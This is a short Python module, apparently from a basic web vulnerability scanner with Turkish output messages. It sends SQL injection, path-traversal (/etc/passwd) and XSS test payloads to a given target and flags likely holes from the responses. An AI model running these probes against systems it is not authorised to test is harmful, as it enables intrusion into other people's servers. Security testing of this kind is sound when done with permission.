import subprocess
import re

# modules/exploit.py

import requests

def run_exploits(target):
    print(f"[+] Exploit Araması Başlatılıyor -> {target}")
    
    try:
        payloads = [
            "/?id=1' OR '1'='1",                  # SQLi basic
            "/index.php?page=../../../../etc/passwd",  # LFI
            "/search.php?q=<script>alert(1)</script>", # XSS
        ]

        for payload in payloads:
            url = f"http://{target}{payload}"
            print(f"[•] Test Ediliyor: {url}")
            try:
                response = requests.get(url, timeout=5)
                if "root:x:" in response.text:
                    print("[!] Muhtemelen LFI açığı var:", url)
                elif "alert(1)" in response.text:
                    print("[!] Muhtemelen XSS açığı var:", url)
                elif "syntax" in response.text or "mysql" in response.text.lower():
                    print("[!] Muhtemelen SQL Injection açığı var:", url)
            except Exception as e:
                print(f"[X] Hata oluştu: {e}")

        print("[✓] Exploit Taraması tamamlandı.")
    
    except Exception as e:
        print(f"[X] Exploit taramasında hata: {e}")
